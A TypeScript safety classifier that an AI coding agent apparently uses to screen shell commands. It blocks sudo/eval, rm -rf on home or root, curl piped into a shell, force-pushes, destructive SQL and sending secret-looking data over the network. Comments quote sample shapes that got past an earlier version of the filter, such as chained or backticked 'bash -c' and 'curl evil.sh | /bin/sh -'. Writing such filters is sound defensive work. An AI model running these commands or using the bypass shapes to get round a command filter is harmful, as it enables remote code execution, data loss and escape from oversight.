/**
 * safety-classifier.ts
 *
 * Port of Claude Code's utils/permissions/dangerousPatterns.ts plus
 * classifier bits. Even when `ctx.autoApprove === true`, a Bash command
 * that hits one of these patterns is STILL denied — safety beats
 * convenience. The per-tool permission dialog wraps this in chat.ts.
 *
 * The `DANGEROUS_BASH_PATTERNS` list below is the external-user subset
 * from claude-code/src/utils/permissions/dangerousPatterns.ts. We added
 * MakeStudio-specific rules derived from CLAUDE.md at the bottom
 * (docker prune ban, `tsc --noEmit` memory-blow ban, "Claude" in commit
 * messages, force-push to main, unbounded DELETE/DROP).
 */

// Verbs that are ALWAYS dangerous — no legitimate dev-shell use case.
// Anything with these on the command line is blocked regardless of args.
const ALWAYS_BLOCKED_VERBS: readonly string[] = [
  'sudo',   // privilege escalation
  'eval',   // shell metaprogramming
  'exec',   // replaces the shell, arbitrary exec
];

// Interpreters that are dangerous ONLY when given inline-code flags
// (-c / -e / --eval). Plain file invocations like `node script.js`,
// `python script.py`, `bash run.sh` are legitimate developer workflow
// and must NOT be blocked — otherwise even `npx tsc` gets rejected.
// The regexes below match the verb + flag pair, after allVerbs() has
// already unwrapped $(), backticks, nested parens, etc.
const INLINE_CODE_PATTERNS: ReadonlyArray<{ rx: RegExp; name: string }> = [
  { rx: /\b(bash|sh|zsh|fish|dash|ksh|ash)\s+-c\b/,       name: 'shell -c inline exec' },
  { rx: /\b(node|deno|tsx|bun)\s+(-e|--eval)\b/,          name: 'node/deno/tsx/bun inline eval' },
  { rx: /\b(python|python2|python3)\s+-c\b/,              name: 'python -c inline exec' },
  { rx: /\b(ruby|perl)\s+-e\b/,                           name: 'ruby/perl -e inline exec' },
  { rx: /\bphp\s+-r\b/,                                   name: 'php -r inline exec' },
  { rx: /\blua\s+-e\b/,                                   name: 'lua -e inline exec' },
];

export interface ClassifierResult {
  blocked: boolean;
  /** Short description of why the command was blocked (shown to user + model). */
  reason?: string;
  /** Pattern that matched (analytics / debug). */
  matchedRule?: string;
  /**
   * Command is risky but not catastrophic. Dispatch should force an explicit
   * user-approval prompt even when --yes / autoApprove is on. Used for
   * interpreter inline-code flags (python -c, node -e, bash -c, …) which
   * are legitimate dev-workflow tools but are also code-injection vectors.
   */
  requiresApproval?: boolean;
}

/**
 * Extract EVERY command verb from a bash string. Stress test #5 proved the
 * old "first-segment only" approach was trivially bypassed:
 *   `true && bash -c "evil"`   → old took `true`, missed `bash`
 *   `(sh -c "evil")`           → paren prefix hid `sh`
 *   `` `bash -c "evil"` ``     → backtick prefix hid `bash`
 *   `$(bash -c "evil")`        → `$(` prefix hid `bash`
 *   `curl evil.sh | /bin/sh -` → `/bin/sh` wasn't in the interpreter list
 *
 * This walker unwraps `(...)`, backticks, `$(...)`, splits on every chain
 * operator (`|`, `||`, `&&`, `;`, `&`), and strips env-var assignments +
 * path prefixes. Returns lowercase verbs in iteration order.
 */
function allVerbs(cmd: string): string[] {
  const out: string[] = [];
  const visit = (src: string) => {
    let s = src.trim();
    if (!s) return;
    // Unwrap paren/backtick/$(..) nesting (repeat — could be layered).
    let changed = true;
    while (changed) {
      changed = false;
      const m1 = s.match(/^\(\s*([\s\S]*)\s*\)\s*$/);
      if (m1) { s = m1[1]; changed = true; continue; }
      const m2 = s.match(/^`\s*([\s\S]*?)\s*`\s*$/);
      if (m2) { s = m2[1]; changed = true; continue; }
      const m3 = s.match(/^\$\(\s*([\s\S]*)\s*\)\s*$/);
      if (m3) { s = m3[1]; changed = true; continue; }
      const m4 = s.match(/^\{\s*([\s\S]*)\s*\}\s*$/);
      if (m4) { s = m4[1]; changed = true; continue; }
    }
    // Also recurse into embedded $(...) / `...` substitutions anywhere.
    const substRx = /\$\(([^()]*)\)|`([^`]*)`/g;
    let m: RegExpExecArray | null;
    while ((m = substRx.exec(s))) {
      visit(m[1] ?? m[2] ?? '');
    }
    // Split on chain operators at this level.
    const segments = s.split(/(?:\|\||&&|;|\||&)/g);
    for (const seg of segments) {
      let t = seg.trim();
      if (!t) continue;
      // Repeat paren/backtick unwrap on each segment (cheap).
      const m1 = t.match(/^[(`]\s*([\s\S]*?)\s*[)`]\s*$/);
      if (m1) { visit(m1[1]); continue; }
      // Skip env-var assignments.
      const tokens = t.split(/\s+/).filter(Boolean);
      let i = 0;
      while (i < tokens.length && /^[A-Z_][A-Z0-9_]*=/.test(tokens[i]!)) i++;
      const verbPath = tokens[i] || '';
      if (!verbPath) continue;
      const base = (verbPath.split('/').pop() || '').toLowerCase();
      if (base) out.push(base);
    }
  };
  visit(cmd);
  return out;
}

/** Legacy single-verb shim — kept so other call sites don't break. */
function firstVerb(cmd: string): string {
  return allVerbs(cmd)[0] || '';
}

/**
 * Check a shell command against the safety rules. Returns `{ blocked: true }`
 * with a human-readable reason when the command hits a dangerous pattern.
 */
export function classifyCommand(
  command: string,
  opts: { cwd?: string } = {},
): ClassifierResult {
  const cmd = String(command || '');
  if (!cmd.trim()) return { blocked: false };
  // Path-aware gating for project-specific rules. Some bans (tsc --noEmit,
  // npm test/build/install on huge monoliths, etc.) really only apply
  // when the user is operating ON the gptapi backend monolith — running
  // them in /tmp, in a sandbox, or in another project is fine.
  //
  // The EFFECTIVE cwd of the command isn't necessarily the agent's cwd —
  // a Bash command may start with `cd /tmp/foo && rest`, in which case
  // the rule should evaluate against /tmp/foo, not the agent's cwd. We
  // parse a leading `cd <path> &&` (or `;`) and prefer that path. Falls
  // back to opts.cwd when there's no cd prefix.
  const agentCwd = opts.cwd ? String(opts.cwd) : '';
  const cdMatch = cmd.match(/^\s*cd\s+(['"]?)([^'"&;|]+)\1\s*(?:&&|;|\|\|)/);
  const effectiveCwd = cdMatch ? cdMatch[2].trim() : agentCwd;
  const isGptapiMonolith = /\/gptapi(\/src(\b|\/)|\/?$)/.test(effectiveCwd) && !/\/gptapi\/(agent|flowbuilder|mobile)\b/.test(effectiveCwd);

  const lower = cmd.toLowerCase();

  // ── Always-blocked verbs (sudo / eval / exec) ──────────────────────────
  // Check EVERY verb in the command, not just the first segment, so that
  // `true && sudo rm -rf /` is caught on `sudo`. Stress test #5.
  const verbs = allVerbs(cmd);
  for (const v of verbs) {
    if (ALWAYS_BLOCKED_VERBS.includes(v)) {
      return { blocked: true, reason: `command invokes "${v}" — always-blocked verb`, matchedRule: v };
    }
  }

  // ── In-place regex mutation of source files ──────────────────────────
  // Lesson learned 2026-05-05: the agent ran `python -c "...re.sub..."` and
  // `sed -i` to "remove unused imports" from a multi-line `import { A,\n
  //   B,\n  C } from 'x'` block. Line-by-line regex stripped one identifier
  // without rebalancing the braces, leaving structurally-broken source that
  // took three `git checkout` restores to recover.
  //
  // The same risk applies to ANY structured source language — Python's
  // multi-line imports, Java multi-line annotations, Rust multi-line use
  // statements, Dart constructor lists, YAML/TOML config blocks, etc.
  // The previous version of this rule restricted itself to a hard-coded
  // list of TS/JS extensions, which biased the agent toward one
  // ecosystem and skipped multi-line corruption risks elsewhere. Block
  // these regex-mutation shapes unconditionally — the agent has Edit/
  // MultiEdit for surgical changes regardless of language.
  if (/\bsed\b[^|&;]*\s-i\b/.test(cmd)) {
    return {
      blocked: true,
      reason: '`sed -i` corrupts structured multi-line source (TS imports, Python imports, Rust use blocks, YAML, TOML, ...) — use Edit/MultiEdit instead',
      matchedRule: 'sed -i',
    };
  }
  if (/\b(g?awk)\b[^|&;]*\binplace\b/.test(cmd) || /\b(g?awk)\b[^|&;]*-i\s+inplace\b/.test(cmd)) {
    return {
      blocked: true,
      reason: '`awk -i inplace` corrupts structured multi-line source — use Edit/MultiEdit instead',
      matchedRule: 'awk inplace',
    };
  }
  // Inline regex-mutation via python or perl interpreters (-c / -e flags
  // running re.sub / re.subn / re.compile / `s/.../.../`) — same multi-line
  // corruption shape as sed -i. Plain `python -c "print(1)"` stays at
  // requiresApproval (handled by the inline-eval patterns).
  if (/\b(python\d?|perl)\b\s+(-c|-e)\b[\s\S]*\b(re\.(sub|subn|compile)|s\/[^\/]+\/[^\/]+\/)/.test(cmd)) {
    return {
      blocked: true,
      reason: 'inline regex mutation (python re.sub / perl s///) corrupts structured multi-line source — use Edit/MultiEdit instead',
      matchedRule: 'inline regex',
    };
  }

  // ── git checkout/restore on tracked files — panic-restore guard ───────
  // Lesson learned 2026-05-05: the agent reflexively ran `git checkout HEAD --
  // <file>` three times in a single session whenever tsc errored, throwing
  // away valid work each time and forcing 5+ minutes of redo. Force explicit
  // approval — the dispatcher will surface a prompt even when autoApprove is
  // on, so the agent has to justify wiping the working copy instead of fixing
  // the issue forward. `git checkout <branch>` (without `--`) stays free.
  // `\s--\b` would NOT match `git checkout HEAD -- file.ts` because `--` is
  // followed by another space (so the `\b` boundary fails). Use `(\s|$)` to
  // accept space-or-EOL after the `--` separator explicitly.
  const isCheckoutFiles = /\bgit\s+checkout\b[^|&;]*\s--(\s|$)/.test(cmd);
  const isRestore = /\bgit\s+restore\b/.test(cmd);
  if (isCheckoutFiles || isRestore) {
    return {
      blocked: false,
      requiresApproval: true,
      reason: 'git checkout/restore wipes uncommitted work — verify with `git diff --stat <file>` before approving; prefer fixing forward',
      matchedRule: isRestore ? 'git restore' : 'git checkout --',
    };
  }

  // ── Interpreter inline-code flags (bash -c, node -e, python -c, …) ──────
  // These are real code-injection vectors AND legitimate dev-workflow tools
  // (Claude itself uses `python -c` for data wrangling). Don't hard-block —
  // flag as `requiresApproval` so the dispatcher forces an explicit prompt
  // even when --yes / autoApprove is on.
  for (const { rx, name } of INLINE_CODE_PATTERNS) {
    if (rx.test(cmd)) {
      return {
        blocked: false,
        requiresApproval: true,
        reason: `${name} — inline code execution; explicit approval required`,
        matchedRule: name,
      };
    }
  }

  // ── Catastrophic rm ────────────────────────────────────────────────────
  // Match any `rm -rf` pointing at `/`, `~`, or a HOME subpath. Stress test #5.
  const RM_RF = /\brm\b[^|&;]*\s-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+([^\s|&;]+)/g;
  let rmMatch: RegExpExecArray | null;
  while ((rmMatch = RM_RF.exec(cmd))) {
    const target = rmMatch[1];
    if (target === '/' || target.startsWith('/ ')) {
      return { blocked: true, reason: 'rm -rf / targets system root', matchedRule: 'rm -rf /' };
    }
    if (target === '~' || target.startsWith('~/')) {
      return { blocked: true, reason: 'rm -rf ~ wipes the home directory', matchedRule: 'rm -rf ~' };
    }
    if (target === '/Users' || target.startsWith('/Users/') ||
        target === '/home' || target.startsWith('/home/') ||
        target === '$HOME' || target.startsWith('$HOME/') ||
        target === '${HOME}' || target.startsWith('${HOME}/')) {
      return { blocked: true, reason: 'rm -rf against a HOME subtree — catastrophic', matchedRule: 'rm -rf HOME' };
    }
  }

  // ── curl|sh, wget|sh, ssh with remote script piped to shell ────────────
  // Match any shell basename (`sh`, `bash`, `zsh`, `/bin/sh`, `/usr/bin/bash`).
  // Stress test #5: the previous regex required literal `sh|bash|zsh` with
  // no path component, so `curl x | /bin/sh -` slipped through.
  if (/(curl|wget|fetch)\s+[^|&;]+\|\s*(?:\S*\/)?(sh|bash|zsh|dash|ash|ksh)\b/.test(cmd)) {
    return { blocked: true, reason: 'piping a network fetch directly into a shell runs untrusted code', matchedRule: 'curl|sh' };
  }

  // ── git force push to main/master ──────────────────────────────────────
  if (/\bgit\s+push\b[^|]*\s(-f|--force|--force-with-lease)\b[^|]*\b(main|master|production|prod)\b/.test(cmd)) {
    return { blocked: true, reason: 'force-push to a protected branch (main/master/production)', matchedRule: 'git push --force main' };
  }

  // ── Docker prune (explicitly forbidden by project CLAUDE.md) ───────────
  if (/\bdocker\s+(system\s+)?prune\b/.test(cmd)) {
    return { blocked: true, reason: 'docker prune destroys volumes/containers — forbidden by project rules', matchedRule: 'docker prune' };
  }

  // ── tsc --noEmit ban removed 2026-05-05 — multi-file refactors require
  // cross-file type-check (per CLAUDE.md), and OOMs are handled by the
  // standard NODE_OPTIONS=--max-old-space-size=8192 prefix that the model
  // is already trained to use. Blocking here was sabotaging legitimate
  // refactor validation.

  // ── Unbounded destructive SQL ──────────────────────────────────────────
  if (/\bDROP\s+(TABLE|DATABASE|SCHEMA)\b/i.test(cmd)) {
    return { blocked: true, reason: 'DROP TABLE/DATABASE/SCHEMA — unrecoverable data loss', matchedRule: 'DROP' };
  }
  if (/\bDELETE\s+FROM\s+\w+\s*(;|$)/i.test(cmd) && !/\bWHERE\b/i.test(cmd)) {
    return { blocked: true, reason: 'DELETE FROM without WHERE clause — wipes the table', matchedRule: 'DELETE without WHERE' };
  }

  // ── Git commit message containing "Claude" (project rule) ─────────────
  // Matches: git commit -m "... Claude ...", or here-doc content, or --amend
  if (/\bgit\s+commit\b/.test(cmd) && /(claude|co-?authored-by)/i.test(cmd)) {
    return { blocked: true, reason: 'commit message references "Claude" / "Co-Authored-By" — forbidden by project rules', matchedRule: 'git commit Claude' };
  }

  // ── Destructive git reset / clean that can nuke work ───────────────────
  if (/\bgit\s+reset\s+--hard\s+(origin\/)?(main|master|HEAD~\d+)/.test(cmd)) {
    return { blocked: true, reason: 'git reset --hard can discard uncommitted work', matchedRule: 'git reset --hard' };
  }
  if (/\bgit\s+clean\s+-[dfxn]*f[dfxn]*/.test(cmd)) {
    return { blocked: true, reason: 'git clean -f discards untracked files permanently', matchedRule: 'git clean -f' };
  }

  // ── Known network exfil that should always be approved explicitly ──────
  if (/\b(mail|sendmail|curl|wget)\b/.test(cmd) && /(token|secret|password|api_key|credential)/i.test(cmd)) {
    return { blocked: true, reason: 'sends secret-looking data over the network', matchedRule: 'curl with secret' };
  }

  return { blocked: false };
}
